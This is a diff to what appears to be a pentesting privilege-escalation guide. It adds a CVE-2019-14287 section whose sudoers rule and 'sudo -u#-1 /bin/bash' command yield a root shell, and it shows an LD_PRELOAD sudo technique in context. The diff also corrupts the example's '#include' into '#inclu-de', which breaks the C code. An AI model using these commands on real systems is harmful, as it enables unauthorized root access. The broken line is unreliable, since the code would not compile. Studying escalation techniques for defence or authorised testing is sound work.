@@ -162,7 +162,7 @@ Firstly we create source code file for a shared object.
 
 {% code title="shell.c" %}
 ```c
-#include <stdio.h>
+#inclu-de <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
 
@@ -185,6 +185,20 @@ Preload this shared object when you run executable you have permission to run wi
 
 ```text
 sudo LD_PRELOAD=<path_to_your_so_file> <executable_you_can_run_with_sudo>
+```
+
+### CVE-2019-14287
+
+If your user has disabled access to some executable.
+
+```text
+user ALL=(ALL,!root) /bin/bash
+```
+
+With ALL specified, user can run the binary `/bin/bash` as any user \(not only root user, other user id's works too\).
+
+```text
+sudo -u#-1 /bin/bash
 ```
 
 ## Cron jobs
